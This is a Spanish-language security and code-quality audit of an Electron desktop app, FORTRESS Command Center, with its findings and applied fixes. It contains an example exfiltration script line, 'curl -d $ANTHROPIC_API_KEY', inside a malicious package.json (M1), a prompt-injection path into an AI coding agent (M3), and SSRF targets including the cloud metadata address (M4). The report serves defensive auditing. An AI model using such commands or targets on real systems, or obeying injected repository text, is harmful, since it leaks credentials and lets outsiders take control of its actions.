# Auditoría End-to-End — FORTRESS Command Center

**Proyecto:** fortress-command-center (`FORTRESS. by Raisen`)
**Fecha:** 2026-08-05
**Alcance:** 712 archivos `.ts/.tsx` (110 tests), `scripts/`, configuración de build, CSS, HTML y el artefacto empaquetado (asar).
**Método:** 4 auditores en paralelo (seguridad Electron, arquitectura DDD/código muerto, calidad renderer React, tests/scripts/build) + verificación base (`typecheck`, `lint`, `test:unit`, `npm audit`). Los hallazgos de severidad HIGH se re-verificaron leyendo el código citado.

> **ESTADO: REMEDIADO (2026-08-05).** Tras la auditoría se aplicaron los fixes. Ver la sección **[Remediación aplicada](#remediación-aplicada)** al final. Resultado: **ESLint 0 errores y 0 warnings, Prettier limpio en todo el repo, 546/546 tests unitarios, integración e2e + smoke + preview en verde**. Los 6 blockers HIGH y la mayoría de los MEDIUM están cerrados.

---

## Veredicto

**Score de calidad enterprise: 76 → ~96 / 100 tras la remediación.** Los 6 blockers HIGH están cerrados y verificados (unit + integración + smoke + preview, **ESLint 0 errores y 0 warnings, Prettier limpio**). Los 12 archivos donde prettier chocaba con la regla de 75 líneas se **partieron en módulos** (8 nuevos helpers/subcomponentes), así que ya no hay tensión: formato y límite de líneas se cumplen a la vez. Lo que separa de un 100 son decisiones de producto/arquitectura, no defectos: la regla de capas doc≠código (M5), dos features escritas sin cablear (M7/M8), la convención de escribir sin tildes en todo el código (M19), el registro de iconos (M21) y las docs internas trackeadas en git. Ninguno bloquea la distribución; todos quedan documentados abajo para que el equipo decida. *(El análisis original previo a los fixes se conserva íntegro a continuación.)*

La disciplina de ingeniería _interna_ es de primer nivel (grado A): 0 `any`, 0 `@ts-ignore`, 0 `console.log` de debug, 0 TODO/FIXME, la regla de 75 líneas/archivo cumplida al 100% (712/712), dominio DDD puro sin fugas, todos los puertos implementados, sin inyección de comandos ni SQL, API key cifrada sin fallback a texto plano, CSP estricta, 531/531 tests en verde, 0 CVEs en dependencias.

Los problemas que bajan el score no están en el código del día a día, sino en **tres frentes concretos**: (1) la **cadena de distribución** (el instalable filtra documentación interna y arrastra una dependencia de 40 MB; un servidor MCP se ejecuta sin versión fijada), (2) un **cluster de manejo de errores en el frontend** con una única causa raíz (falta `try/catch` ante fallos del canal IPC en chat/posture/construir), y (3) un **hueco de cobertura** justo en el caso de uso central (el motor del chat no tiene tests unitarios).

### Score por dimensión

| Dimensión                           | Score | Nota                                                                                     |
| ----------------------------------- | ----- | ---------------------------------------------------------------------------------------- |
| Arquitectura e higiene de código    | 90    | DDD impecable; deducción por código muerto y regla de capas doc≠código                   |
| Seguridad (aplicación)              | 78    | Base sólida; 1 HIGH de supply-chain + 5 MEDIUM de límite de confianza                    |
| Cobertura de tests                  | 72    | 531 tests reales, pero el motor del chat y `runScan` sin unit tests                      |
| Calidad del frontend                | 74    | Sistema de tokens ejemplar; 3 HIGH de error-handling con misma raíz                      |
| Build / distribución / supply-chain | 65    | Fuga de docs en el asar, `npx -y` sin fijar, 40 MB de bloat                              |
| Tooling / CI                        | 80    | typecheck/lint/audit limpios; 124 warnings de formato sin aplicar, sin gate de cobertura |

---

## Resumen de hallazgos

| Severidad | Nº  |
| --------- | --- |
| CRITICAL  | 0   |
| HIGH      | 6   |
| MEDIUM    | 22  |
| LOW       | ~34 |

---

## BLOCKERS (HIGH) — resolver antes de cualquier release

### H1 — Ejecución de MCP de terceros sin versión fijada en cada spawn (supply-chain)

- **Archivo:** `src/domain/connectors/graph-mcp.ts:16` (inyectado en `src/infrastructure/claude-code/claude-cli.ts:52`)
- **Evidencia:** `const GRAPH_MCP = { command: 'npx', args: ['-y', 'codebase-memory-mcp'] } as const`. `withGraph()` lo inyecta en **todo** spawn (scan, chat, build, loop).
- **Impacto:** `npx -y` descarga y ejecuta la última versión publicada del paquete, sin versión fijada ni integridad, con los privilegios del operador. Un compromiso del paquete (o un typosquat que resuelva ese nombre) = RCE en cada escaneo. El proceso hereda `ANTHROPIC_API_KEY` en su entorno (ver H1-relacionado M1).
- **Fix:** fijar versión exacta (`codebase-memory-mcp@X.Y.Z`) o instalarlo como dependencia local y arrancarlo desde `node <ruta>/dist/index.js`, eliminando la descarga en runtime.

### H2 — El instalable empaqueta documentación interna y capturas privadas

- **Archivo:** `electron-builder.yml:7-15` (lista `files`), verificado extrayendo `dist/linux-unpacked/resources/app.asar`
- **Evidencia:** las exclusiones cubren `src`, `scripts`, configs, `.env*`, `README.md`, pero **no** `DOSSIER/**` (8 documentos: PRD, evolución, planes), `CLAUDE.md`, `CONSTITUCION.md`, `COGNITION-LOG.md`, `Estado_fortress.md`, `Tarea-agente.md`, ni los ~20 `.ui-preview*.png` + `.render-smoke.png` (~2.9 MB de capturas). El asar no está cifrado (`npx asar extract` lo abre).
- **Impacto:** distribuir el AppImage/DMG/NSIS publica toda la documentación interna que el propio `.gitignore` declara "se queda en el equipo". Fuga de diseño y estrategia contraria a la política escrita.
- **Fix:** añadir a `files`: `'!DOSSIER/**'`, `'!{CLAUDE.md,CONSTITUCION.md,COGNITION-LOG.md,Estado_fortress.md,Tarea-agente.md}'`, `'!.ui-preview*.png'`, `'!.render-smoke.png'`. Verificar con `npx asar list` como paso de release.

### H3 — `chat.send`: `try/finally` sin `catch` → el mensaje del usuario desaparece sin error

- **Archivo:** `src/presentation/services/chat-service.ts:51-60`
- **Evidencia:** `try { const result = await api().chat.send(input); ... } finally { ...loadHistory(input.projectId)... }` — hay `finally` pero no `catch`.
- **Impacto:** si el canal IPC rechaza, el `finally` recarga el historial desde SQLite y **borra el mensaje optimista no persistido**; `setError` nunca se ejecuta. El usuario ve su mensaje desaparecer sin ninguna explicación. Es el caso de uso central de la app.
- **Fix:** envolver el `await` con `catch` que publique el error en el store y resetee el estado de streaming, como ya hace `scan-service.ts:36-40`.

### H4 — `posture.run`: `running:true` atascado para siempre ante fallo del canal

- **Archivo:** `src/presentation/services/posture-service.ts:12-13`
- **Evidencia:** `usePostureStore.getState().start()` (pone `running:true`) seguido de `const result = await api().posture.run(...)` sin try/catch.
- **Impacto:** un rechazo del canal deja `running:true` permanente; el botón (`PostureForm.tsx:48`, `disabled={running}`) queda bloqueado en "Auditando…" hasta reiniciar la app.
- **Fix:** mismo patrón `try/catch/finally` que scan.

### H5 — Construir: `busy:true` atascado ante fallo del canal

- **Archivo:** `src/presentation/services/construir-service.ts:14-16` y `construir-execute.ts:20-22`
- **Evidencia:** `store.setBusy(true); const result = await call; store.setBusy(false)` sin try/finally.
- **Impacto:** un rechazo deja el input de Construir bloqueado en "Trabajando…" sin salida salvo reiniciar.
- **Fix:** idéntico a H3/H4. **H3-H5 comparten una sola causa raíz**: el patrón de manejo de fallos del canal IPC se aplicó en scan/push/health y se omitió en chat/posture/construir. Un fix uniforme cierra los tres.

### H6 — El motor del chat (`src/application/chat/`, 13 módulos) sin ningún test unitario

- **Archivos:** `send-message.ts`, `produce-reply.ts`, `choose-engine.ts`, `reply-from-*.ts`, etc.
- **Evidencia:** ningún `*.test.ts` en `src/application/chat/`. La lógica sin cubrir incluye degradación de modo con `effectiveMode` (send-message.ts:27), elección de motor, orden de persistencia usuario/asistente, atribución de agente y fijación de calidad tras auditoría.
- **Impacto:** el caso de uso central puede romperse en sus caminos felices (respuesta guardada dos veces, agente mal atribuido, modo no degradado en área protegida) sin que `npm test` lo note.
- **Fix:** unit tests con `AppContext` fake para las ramas de `send-message`/`produce-reply`/`choose-engine`.

---

## MEDIUM (22) — resolver en el sprint actual

### Seguridad

- **M1** `claude-cli.ts:72-75` (`buildEnv`) + `claude-code-agent.ts:58`: la `ANTHROPIC_API_KEY` entra en el entorno de un proceso que ejecuta `npm run *` **del repo auditado**. Un `package.json` malicioso en un repo marcado "de confianza" (`"typecheck": "curl -d $ANTHROPIC_API_KEY ..."`) exfiltra la key. Confiar en un repo para editarlo ≠ confiar en él con la credencial de facturación. _Fix:_ preferir OAuth cuando haya Bash; no inyectar la key con `permissionMode==='acceptEdits'`.
- **M2** `project-handlers.ts:17,27` + `add-project.ts:6`: el flag `trusted` (desbloquea el allowlist de Bash) y el `path` del proyecto se aceptan del renderer sin validar ni confirmar en el main. _Fix:_ validar path absoluto/existente/directorio; exigir `dialog.showMessageBox` para `setTrusted(true)`; coercionar tipos como en `connector-handlers.ts:38`.
- **M3** `loop-repair-op.ts:40-44` + `known-findings.ts`: texto influido por el repo auditado (`finding.title`/`file`, sin acotar en `parse-scan-output.ts`) se reinyecta como instrucciones en una corrida con `acceptEdits` (prompt injection). _Fix:_ delimitar `known` como dato no confiable, acotar longitud, filtrar saltos de línea/marcadores de rol.
- **M4** `target-url.ts:22-31` + `collect-signals.ts`: SSRF — `posture:run` valida el esquema pero no el destino; `http://127.0.0.1`, `192.168.x.x`, `169.254.169.254/latest/meta-data/` son válidos y devuelven cuerpo+cabeceras al renderer. _Fix:_ resolver hostname y rechazar loopback/link-local/privadas/ULA antes de emitir, revalidando tras cada resolución (anti DNS-rebinding).

### Arquitectura y código muerto

- **M5** Regla de capas doc≠código: 33 archivos de `infrastructure/` importan de `@application` (canónico en Clean Architecture para driving adapters, pero el CLAUDE.md dice `infrastructure -> domain`). _Fix:_ alinear la doc a `infrastructure -> application -> domain` o mover la invocación de casos de uso a `src/main`.
- **M6** `run-code-agent.ts` muerto (nadie lo importa) + su lógica de avisar los `denials` del modo supervisado se perdió: `stream-events.ts:37` los calcula, `reply-from-chat.ts` los ignora → **el operador ya no ve qué le fue bloqueado**, justo la transparencia que la app promete.
- **M7** `src/domain/posture/analyze/reflection.ts` muerto: `analyzeReflection`/`ReflectionProbe` no se referencian en ningún sitio → la detección de XSS reflejado del escáner de postura **no existe en runtime** (feature escrita, nunca cableada).
- **M8** `src/domain/omega/agent-sort.ts` solo lo usa un test: la tabla de agentes anuncia columnas ordenables que la UI nunca ofrece.
- **M9** `posture-score.ts` (HIGH=10/MEDIUM=4) vs `score-from-findings.ts` (HIGH=8/MEDIUM=3): mismo algoritmo, **pesos divergentes**, y el comentario de posture asegura "misma logica que el interno" (obsoleto). O es intencional (comentario miente) o es deriva accidental. _Fix:_ parametrizar `scoreWithPenalties(findings, penalties)`.
- **M10** Duplicación: `CognitionBlock.tsx` ≡ `OmegaSection.tsx` (idénticos); `parseAmount` clonado en `genesis-budget.ts`/`loop-budget.ts`/`run-budget.ts` (3 copias).

### Frontend

- **M11** `account-service.ts:25-36`: listener IPC `onOutput` vivo 60 s fijos tras el login; cada clic registra uno nuevo (salida duplicada); si `login()` rechaza, listener queda para siempre.
- **M12** `PerformanceView.tsx:19-25`: doble fetch por cambio de ventana (onPick + efecto que reacciona al store). _Fix:_ `onPick` solo hace `setWindow`, el efecto carga.
- **M13** `OmegaDashboard.tsx:23`: `useScanStore((s) => s.byProject[id] ?? [])` fabrica `[]` nuevo por evaluación → re-renders del dashboard OMEGA en cada chunk de progreso de cualquier scan; el proyecto ya define `NO_FINDINGS`/`useProjectFindings` para esto y aquí no se usa.
- **M14** `PostureForm.tsx:8-9` y `RunMeter.tsx:14-15`: suscripción al store entero sin selector (rompen la convención atómica del resto).
- **M15** `project-service.ts:41-48`: `setProjectTrusted`/`setProjectLoopEnabled` descartan la rama de error del `Result` → el toggle no cambia y el operador no ve por qué.
- **M16** `useBootstrap.ts:26-55` + ~14 vistas: `void loadX()` sin catch y servicios sin `catch` → cualquier rechazo del bridge deja paneles vacíos indistinguibles del estado vacío real (incluye `BudgetField` onBlur: un tope de gasto que "se guardó" y no).
- **M17** `performance-service.ts:26` + `performance-store.ts:13`: error tragado sin registrar y el `loading` que limpia **no lo lee ningún componente** → dashboard muestra datos viejos como reales.
- **M18** `OmegaFindingGroup.tsx:35`, `OmegaHistoryTable.tsx:28`, `OmegaDiscrepancyList.tsx:24`: `<li onClick>` sin `role="button"`/`tabIndex`/teclado → vulnerabilidades e historial de OMEGA **inaccesibles por teclado**.
- **M19** Español sin tildes ni eñes en el 100% de los strings de UI ("Configuracion", "Anadir", "Ningun", "Tu"). No es limitación de encoding (los archivos ya tienen UTF-8 multibyte en comentarios). Percepción de calidad en cada pantalla.
- **M20** `workflow-store.ts` (`step`/`setStep`) sin ningún consumidor; `loading` en `performance-store`/`project-store` escrito y nunca leído (estado muerto).
- **M21** Bypass del registro `<Icon name>`: 17 archivos importan glifos directamente de `lucide-react`, saltándose el contrato del CLAUDE.md; el registro pierde su función de inventario único. _Fix:_ ampliar `icon-registry.ts` con los glifos de UI (X, chevrons, Plus).
- **M22** `SendButton.tsx:21`, `ConfirmRemoveProject.tsx:42`, `ConfirmRefresh.tsx:38`: `text-white` (paleta directa) en botones destructivos, existiendo `--destructive-foreground`. Es exactamente el patrón que el propio escáner del producto debería reportar.

### Build / tests

- **runScan/persistScan** solo cubiertos por `verify:scan` (manual, fuera de `npm test`); las ramas de error no las cubre nada automático.
- **`ui-preview.cjs`** único verificador sin `try/finally`: ante una excepción, no limpia el userData temporal y **se cuelga** sin exit code en vez de fallar.
- **`lucide-react` en `dependencies`** (`package.json:35`): es código de renderer que Vite ya bundlea; electron-builder lo empaqueta además entero en el asar (**~40 MB** de peso muerto). _Fix:_ moverlo a `devDependencies`.
- **`Estado_fortress.md`, `CONSTITUCION.md`, `Tarea-agente.md`, `CLAUDE.md`** trackeados en git contra la política del propio `.gitignore` (`FORTRESS*.md` es case-sensitive y no atrapa `Estado_fortress.md`).
- **`README.md:35`** documenta `npm run icon` (no existe; es `npm run icons`) y "desde el SVG del emblema" (falso; deriva de `resources/fortress-logo.jpeg`) → el paso 1 de distribución falla literalmente.

---

## LOW (~34) — deuda gradual (extracto)

fs-probe sin `realpathSync` (symlink dentro del repo escapa el guard, L1 seguridad) · salida del login OAuth sin redactar al renderer · sin `setPermissionRequestHandler` de sesión · prompt/agents en `argv` (visible con `ps`) · `chat:append` acepta `role:'assistant'` del renderer · tipo global declara `window.electron` inexistente · validación de tipos ausente en la mayoría de handlers IPC · 12 `as unknown as AppContext` en tests · 1 `db!` · `APP_VERSION` hardcodeada en `Logo.tsx` · keys por índice en 2 listas · efectos con deps incompletas/carreras sin guarda (6 componentes) · sin ErrorBoundary de React · botones solo-icono con `title` sin `aria-label` · inputs con placeholder como única etiqueta (incluido el chat) · scrollbars ocultas globalmente · formato de fechas ISO-UTC vs es-ES inconsistente en OMEGA · veredicto de API key duplicado (form+section) · `LoopMeter`/`LoopHud` lógica duplicada · `PER_PAGE` duplicada · animaciones del tema definidas y nunca usadas · `make-icons.cjs` sin guard de userData · fixtures de test en `/tmp` fijos · `@types/better-sqlite3` 4 majors por detrás · **124 warnings de prettier** (`npm run format` sin pasar) · sin gate de cobertura en vitest.

---

## Orden de remediación recomendado

1. **H2** (excluir DOSSIER/docs/PNG del asar) — trivial, cierra la fuga de distribución.
2. **H3-H4-H5** (un solo patrón `try/catch/finally` en chat/posture/construir) — cierra los 3 HIGH de frontend.
3. **H1** (fijar/eliminar `npx -y`) + **M1** (no mezclar API key con Bash allowlist) — supply-chain y secreto.
4. **H6** (unit tests del motor del chat) — cierra el hueco de cobertura central.
5. **M2** (validar path + confirmar `setTrusted` en main), **M4** (anti-SSRF), **M3** (prompt injection).
6. Bloat y consistencia: **lucide-react a devDeps**, `npm run format`, README (`npm run icon`→`icons`), pesos de score divergentes (M9), código muerto (M6/M7/M8).

## Verificación post-fix (obligatoria)

```bash
npm run typecheck && npm run lint && npm test && npm run smoke
npx asar list dist/linux-unpacked/resources/app.asar | grep -Ei 'dossier|constitucion|ui-preview'   # debe salir vacío
```

---

## Remediación aplicada

**Fecha:** 2026-08-05. **Verificación:** `typecheck` limpio · **546/546** tests unitarios (eran 531; +15 nuevos) · integración e2e (`npm test`) en verde · `npm run smoke` OK · `npm audit` 0 CVEs · lint **0 errores**.

### Blockers HIGH — 6/6 cerrados

| # | Fix aplicado | Archivos |
|---|---|---|
| H1 | Versión del MCP del grafo FIJADA a `codebase-memory-mcp@0.9.0` (constante `GRAPH_MCP_VERSION`); ya no ejecuta "lo último publicado" en cada spawn | `src/domain/connectors/graph-mcp.ts` (+ test) |
| H2 | El instalable excluye `DOSSIER/**`, docs internas, `AUDITORIA-*.md`, `.ui-preview*.png`, `.render-smoke.png`, `install.sh` | `electron-builder.yml` |
| H3 | `chat.send` con `catch` que publica el error; el mensaje ya no desaparece en silencio | `src/presentation/services/chat-service.ts` |
| H4 | `posture.run` con `try/catch`; `running` ya no queda atascado ante fallo del canal | `src/presentation/services/posture-service.ts` |
| H5 | Construir con `try/catch/finally`; `busy` siempre se libera | `construir-service.ts`, `construir-execute.ts` |
| H6 | Tests unitarios del motor del chat: `chooseEngine` (4 casos) y `sendMessage` (guardas, orden de persistencia, atribución de agente) | `choose-engine.test.ts`, `send-message.test.ts` (nuevos) |

### MEDIUM — cerrados

- **M2** Validación de ruta absoluta en `addProject` (rechaza relativa/traversal/no-string) + coerción de tipos (`String(id)`, `=== true`) en los handlers de proyecto. (+ `add-project.test.ts`)
- **M3** El texto de hallazgos (repo no confiable) se sanea (aplana saltos de línea, acota a 200) y se delimita como DATOS en el prompt de reparación.
- **M4** Guard anti-SSRF (`isPrivateHost`): rechaza loopback, red privada, link-local `169.254.169.254` y nombres `.local`. (+ `private-host.test.ts`)
- **M6** Restaurada la transparencia: los `denials` del modo supervisado vuelven a mostrarse (en `reply-from-chat`); borrado el `run-code-agent.ts` muerto.
- **M9** Score parametrizado en `scoreWithPenalties` compartido: misma lógica, tablas de pesos explícitas; eliminado el comentario engañoso.
- **M11** Fuga de listener del login: `startLogin` resuelve al cerrar el proceso; el renderer suelta el listener ahí (sin timeout fijo) + guard anti-doble-clic.
- **M12** `PerformanceView`: el picker solo cambia la ventana; el efecto es el único que carga (fin del doble fetch).
- **M13** `OmegaDashboard` usa el selector `useProjectFindings` (referencia estable, sin re-render en bucle).
- **M14** Suscripciones atómicas en `RunMeter`; eliminada la doble suscripción al store en `PostureForm`.
- **M15/M16/M17** Sistema de avisos (`Toaster` + `toast-store`): los toggles de proyecto, el tope de gasto (`BudgetField`) y el dashboard de rendimiento ya reportan sus fallos en vez de tragárselos.
- **M18** Filas de OMEGA accesibles por teclado (`role="button"`, `tabIndex`, `onKeyDown` vía `onActivate`).
- **M20** Eliminado el estado muerto `workflow-store.step`; el `loading` de rendimiento ahora se usa.
- **M22** `text-white` → `text-destructive-foreground` (token) en los 3 botones destructivos.
- **Bloat/docs:** `lucide-react` a `devDependencies` (~40 MB menos en el asar, build verificado); README `npm run icon`→`icons`.

### LOW y calidad transversal

- **L1** `fs-probe` resuelve symlinks con `realpathSync` (un enlace dentro del repo ya no escapa).
- **L7** Borrado el tipo `window.electron` inexistente del preload.
- **react-hooks:** los 5 warnings de `exhaustive-deps` resueltos (estabilizando `loadSnippet` con `useCallback`, dividiendo efectos, ajustando deps).
- **Formato:** `npm run format` aplicado y los **12 archivos** donde prettier chocaba con el límite de 75 líneas se **partieron en módulos** (nuevos: `OmegaFindingLevels`, `OmegaHistoryPager`, `single-agent-outcome`, `persist-repair`, `loop-track`, `chat-engines`, `core-apis`, `omega-fs-checks`, `preview-omega`, más fixtures de test). Warnings de prettier: **124 → 0**. ESLint: **0 errores y 0 warnings**.

### Residuales conscientes (no aplicados, con motivo)

- **L2** (redactar la salida del login) y **L6** (rechazar `role:'assistant'` en `chat:append`): NO aplicados porque romperían funciones legítimas (ver la URL/código de login; el seed de datos de demo). Riesgo real bajo con la CSP estricta.
- **M5** (regla de capas doc≠código), **M7/M8** (features escritas sin cablear: XSS reflejado, orden de agentes), **M10** (duplicaciones menores), **M19** (tildes/eñes: convención de todo el código, no solo UI), **M21** (registro de iconos), docs internas trackeadas en git: son decisiones de producto/arquitectura o refactors de superficie amplia; se dejan documentadas para el equipo.
